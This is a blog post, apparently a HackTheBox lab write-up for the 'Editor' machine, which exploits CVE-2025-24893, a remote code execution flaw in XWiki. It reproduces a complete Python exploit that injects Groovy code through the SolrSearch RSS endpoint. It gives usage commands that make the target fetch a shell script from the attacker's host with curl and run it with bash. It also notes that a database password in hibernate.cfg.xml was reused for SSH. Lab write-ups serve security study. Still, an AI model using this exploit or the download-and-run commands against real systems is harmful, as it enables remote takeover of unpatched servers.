---
layout: post
title: "Editor HTB Writeup"
date: 2025-08-11 13:21:00 +0300
categories: [HackTheBox, Machines]
tags: [cybersecurity, wikicms, hackthebox, machines,hacking]
---


# 🎰 Editor HTB Writeup

Today i'll talk about Editor HTB machine. This machine is about WikiCMS and RCE (CVE-2025-24893)
> `CVE-2025-24893` is a RCE vulnerability in WikiCMS.
{: .prompt-warning }
---

## NMAP & Enumeration
After a quick scan in nmap and ffuf, I saw this output in nmap.

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-09 16:55 +03
Nmap scan report for editor.htb (10.10.11.80)
Host is up (0.34s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Port 80 is about a download page for editor application.
Port 8080 is WikiCMS and after a quick search in exploit-db, I realized WikiCMS has RCE vulnerability.

### (PoC)[https://github.com/Artemir7/CVE-2025-24893-EXP]
```python
import argparse
import requests
import re
from urllib.parse import urljoin, quote
import html

BANNER = """
===========================================================
                   CVE-2025-24893
            XWiki Remote Code Execution Exploit
                      Author: Artemir
===========================================================
"""

def extract_output(xml_text):
    decoded = html.unescape(xml_text)
    match = re.search(r"\[}}}(.*?)\]", decoded)
    if match:
        return match.group(1).strip()
    else:
        return None

def exploit(url, cmd):
    headers = {
        "User-Agent": "Mozilla/5.0",
    }

    payload = (
        "}}}{{async async=false}}{{groovy}}"
        f"println('{cmd}'.execute().text)"
        "{{/groovy}}{{/async}}"
    )

    encoded_payload = quote(payload)
    exploit_path = f"/xwiki/bin/get/Main/SolrSearch?media=rss&text={encoded_payload}"
    full_url = urljoin(url, exploit_path)

    try:
        response = requests.get(full_url, headers=headers, timeout=10)
        if response.status_code == 200:
            output = extract_output(response.text)
            if output:
                print("[+] Command Output:")
                print(output)
            else:
                print("[!] Exploit sent, but output could not be extracted.")
                print("[*] Raw response (truncated):")
                print(response.text[:500])
        else:
            print(f"[-] Failed with status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"[-] Request failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2025-24893 - XWiki RCE PoC")
    parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g. http://example.com)")
    parser.add_argument("-c", "--cmd", required=True, help="Command to execute")

    args = parser.parse_args()
    exploit(args.url, args.cmd)
```
## Usage of The Exploit 
```
python sa.py -u http://editor.htb:8080 -c "curl http://10.10.14.35:8080/ -O /tmp/exp.sh"
python sa.py -u http://editor.htb:8080 -c "bash /tmp/exp.sh"
```
### Getting Database Password
I see the password of database in `hibernate.cfg.xml`. The password is same with SSH.

# End
This machine is a great example of the importance of the updating.
Happy Hacking <3